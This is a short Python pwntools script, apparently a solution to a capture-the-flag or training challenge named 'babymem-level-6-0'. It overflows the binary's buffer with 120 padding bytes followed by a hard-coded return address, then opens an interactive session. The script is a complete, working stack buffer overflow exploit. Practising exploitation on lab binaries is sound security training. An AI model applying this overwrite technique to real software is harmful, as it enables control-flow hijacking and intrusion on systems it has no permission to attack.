from pwn import *

elf = ELF("/challenge/babymem-level-6-0")

p = elf.process()

p.sendline(b"512")


address = 0x4020ab

payload = b"A"*120 + p64(address)
p.sendline(payload)


p.interactive()
